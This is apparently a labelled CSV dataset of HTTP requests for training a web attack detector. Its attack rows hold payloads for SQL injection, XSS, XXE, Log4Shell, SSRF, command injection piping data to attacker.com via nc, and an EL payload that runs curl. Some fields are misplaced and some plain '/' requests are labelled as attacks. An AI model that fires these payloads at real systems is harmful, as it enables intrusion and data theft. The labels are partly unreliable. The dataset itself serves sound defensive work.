method,path,query,headers,body,ua,label
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,/,,,,,0
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,,,,,0
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,/,,,,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,$(whoami),,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,id=1&id=2,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,$(whoami),,,,,1
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,http://attacker.com/shell.txt,,,,,1
GET,gzip compressed content with chosen prefix,,,,,1
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,1
GET,/,,,,,0
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,0
GET,`uname -a`,,,,,1
GET,/,,,,,0
GET,/podcasts/latest.xml,,,,,0
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,/,,,,,0
GET,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,,,1
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,0
GET,/,,,,,0
GET,%0d%0aBcc: victim@example.com,,,,,1
GET,/,,,,,0
POST,/,,,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,id=1; SELECT pg_sleep(5)--,,,,,1
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,Host: evil.com,,,,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,Host: evil.com,,,,,1
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,javascript:alert(1),,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,{{7*7}} or {{config.items()}},,1
GET,/,,,,,0
GET,..%c0%af..%c0%af..%c0%afetc/passwd,,,,,1
GET,/,id=1'/**/OR/**/'1'='1,,,,1
GET,/,,,,,0
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,,,,,0
GET,/,,,,,1
GET,; echo $USER | nc attacker.com 1234,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,,1
GET,/,,,,,0
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,http://127.0.0.1:22,,,,,1
GET,; echo $USER | nc attacker.com 1234,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,\x81\xfe\x00\x00... (illegal length),,,,,1
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,expect://id,,,,,1
POST,/,,,"{""$where"": ""this.user == 'admin'""}",,1
GET,/,,,,,0
GET,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,,,1
GET,X-Forwarded-Host: attacker.com,,,,,1
GET,/,,,,,0
GET,${os.system('id')},,,,,1
GET,/,id=1'/**/OR/**/'1'='1,,,,1
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,,,1
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,,,,1
GET,gzip compressed content with chosen prefix,,,,,1
GET,%0d%0a* CAPABILITY,,,,,1
POST,/,,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,0
GET,/,,,,,0
GET,php://input,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,gopher://localhost:6379/_SET%20foo%20bar,,,,,1
GET,/,,,,,0
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,\x81\xfe\x00\x00... (illegal length),,,,,1
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
GET,/,,,,,0
GET,/,id=0x27204f52202731273d2731,,,,1
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,id=1' OR '1'='1,,,,,1
GET,/,id=0x27204f52202731273d2731,,,,1
GET,gzip compressed content with chosen prefix,,,,,1
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
PUT,/billing/address,,,"{""street"": ""123 Main St"", ""city"": ""Hanoi""}",,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,,,,,0
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
GET,"id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,__proto__[admin]=true,,,,1
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,<body onload=alert(1)>,,,,,1
GET,/,,,,,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,java\tscript:alert(1),,,,,1
GET,|| ls -la,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,$(whoami),,,,,1
,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,,,,1
,/,,,,,0
GET,"id=1 UNION SELECT null, user(), database()--",,,,,1
GET,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,,,1
GET,ac ed 00 05 73 72 00 12 ...,,,,,1
GET,/,,,,,0
POST,/,,,{{constructor.constructor('alert(1)')()}},,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/,,,,,0
GET,/,id=1&id=2,,,,1
GET,%0als,,,,,1
GET,id=1'; WAITFOR DELAY '0:0:5'--,,,,,1
GET,/,,,,,0
GET,phar://path/to/malicious.phar/shell.php,,,,,1
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,1
GET,/,,,,,0
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,,,1
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
,/,,,,,0
GET,/,,,,,0
GET,|| ls -la,,,,,1
GET,; cat /etc/passwd,,,,,1
POST,/,,,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,/,php://filter/convert.base64-encode/resource=index.php,,,,1
GET,java\tscript:alert(1),,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,%0als,,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,http://attacker.com/shell.txt,,,,,1
GET,..%c0%af..%c0%af..%c0%afetc/passwd,,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,' or '1'='1,,,,,1
GET,/api/v1/ping,,,,,0
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,http://169.254.169.254/latest/meta-data/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,phar://path/to/malicious.phar/shell.php,,,,,1
GET,/,,,,,0
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,../../../../etc/passwd%00,,,,,1
POST,/,,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,,,,0
GET,..%c0%af..%c0%af..%c0%afetc/passwd,,,,,1
GET,http://attacker.com/shell.txt,,,,,1
GET,/,,,,,0
GET,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,,,1
POST,/,,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,' or '1'='1,,,,,1
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,url=http://malicious.com,,,,1
GET,/,,,,,0
POST,/,,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,,,1
POST,/,,,{{7*7}} or {{config.items()}},,1
GET,/,,,,,0
GET,$(whoami),,,,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,http://127.0.0.1:22,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,expect://id,,,,,1
GET,/,,,,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
POST,/,,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,/,,,,,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
GET,<body onload=alert(1)>,,,,,1
GET,/,,,,,0
GET,; cat /etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,,1
GET,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,,,1
GET,/,,,,,0
POST,/api/v1/logs/frontend,,,(traceback),,0
GET,/,,,,,0
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,//////////////////etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,,,1
POST,/,,,"[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/,,,,,1
GET,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,,,1
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,/,id=1'/**/OR/**/'1'='1,,,,1
GET,<body onload=alert(1)>,,,,,1
GET,| id,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,%0d%0aBcc: victim@example.com,,,,,1
GET,Host: evil.com,,,,,1
GET,../../../../etc/passwd,,,,,1
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,<body onload=alert(1)>,,,,,1
GET,../../../../etc/passwd%00,,,,,1
GET,%0d%0a* CAPABILITY,,,,,1
POST,/,,,"{""__proto__"": {""isAdmin"": true}}",,1
POST,/,,,"{""$where"": ""this.user == 'admin'""}",,1
GET,/,,,,,0
GET,X-Forwarded-Host: attacker.com,,,,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,gzip compressed content with chosen prefix,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,,,,1
GET,/,,,,,0
GET,php://input,,,,,1
GET,/,,,,,0
GET,javascript:alert(1),,,,,1
GET,/,,,,,0
GET,dict://localhost:11211/stat,,,,,1
GET,' or '1'='1,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,0
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,phar://path/to/malicious.phar/shell.php,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,; echo $USER | nc attacker.com 1234,,,,,1
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,/,,,,,0
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,java\tscript:alert(1),,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,http://169.254.169.254/latest/meta-data/,,,,,1
GET,http://attacker.com/shell.txt,,,,,1
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,,,1
GET,/,,,,,0
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,,,1
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,/,,,,,0
GET,"id=1 UNION SELECT null, user(), database()--",,,,,1
GET,http://attacker.com/shell.txt,,,,,1
GET,/,,,,,0
GET,Host: evil.com,,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,0
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,/,,,,,0
GET,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,,,1
GET,/,,,,,0
,/,,,,,0
POST,/,,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,,,,0
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,1
GET,/,,,,,0
GET,X-Forwarded-Host: attacker.com,,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,%0als,,,,,1
GET,/,,,,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,| id,,,,,1
GET,<body onload=alert(1)>,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,|| ls -la,,,,,1
GET,/,adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d,,,,1
GET,/,,,,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,%0als,,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,/,,,,,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/,__proto__[admin]=true,,,,1
GET,phar://path/to/malicious.phar/shell.php,,,,,1
GET,admin*)(| (password=*)),,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,0
GET,rmi://attacker.com:1099/Exploit,,,,,1
GET,http://attacker.com/shell.txt,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,$(whoami),,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,id=1; SELECT pg_sleep(5)--,,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
GET,java\tscript:alert(1),,,,,1
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,,1
GET,/,,,,,0
GET,`uname -a`,,,,,1
GET,/,,,,,0
GET,../../../../etc/passwd%00,,,,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,,,,,0
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,/,,,,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,0
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,http://127.0.0.1:22,,,,,1
GET,/,,,,,0
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,/,,,,,0
GET,%0d%0a* CAPABILITY,,,,,1
GET,/,,,,,0
GET,/,id=1'/**/OR/**/'1'='1,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,|| ls -la,,,,,1
POST,/api/v1/deliver/kindle,,,"{""book_id"": ""b_772""}",,0
GET,id=1' OR '1'='1,,,,,1
GET,/,,,,,0
GET,"id=1 UNION SELECT null, user(), database()--",,,,,1
POST,/,,,"{""__proto__"": {""isAdmin"": true}}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,ac ed 00 05 73 72 00 12 ...,,,,,1
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,/,,,,,0
GET,/,adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,,,,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,,,1
GET,/,,,,,0
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
POST,/,,,"[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/,,,,,0
POST,/,,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,,,,,0
GET,../../../../tmp/shell.php (inside zip archive),,,,,1
GET,/,,,,,0
GET,%253cscript%253ealert(1)%253c/script%253e,,,,,1
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
GET,/,,,,,0
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,gzip compressed content with chosen prefix,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,1
GET,/,,,,,0
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,; echo $USER | nc attacker.com 1234,,,,,1
GET,/,,,,,0
POST,/,,,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,Host: evil.com,,,,,1
GET,; /bin/c?t /e*c/p?sswd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,,,1
GET,/,,,,,0
GET,phar://path/to/malicious.phar/shell.php,,,,,1
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,/,id=1&id=2,,,,1
GET,/,,,,,0
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
GET,/,,,,,0
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,/,,,,,1
GET,../../../../tmp/shell.php (inside zip archive),,,,,1
GET,cos\nsystem\n(S'id'\ntR.,,,,,1
GET,/,,,,,0
GET,http://attacker.com/shell.txt,,,,,1
GET,<img src=x onerror=alert(1)>,,,,,1
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,,,1
GET,/,,,,,0
POST,/,,,"{""$where"": ""this.user == 'admin'""}",,1
POST,/,,,{{7*7}} or {{config.items()}},,1
GET,/,,,,,0
,/,,,,,0
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
,/,,,,,0
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,,,1
GET,/,,,,,0
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,id=1' OR '1'='1,,,,,1
GET,/,,,,,1
GET,/,,,,,0
GET,phar://path/to/malicious.phar/shell.php,,,,,1
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,1
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,,,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,(&(uid=admin)(|(password=*))),,,,1
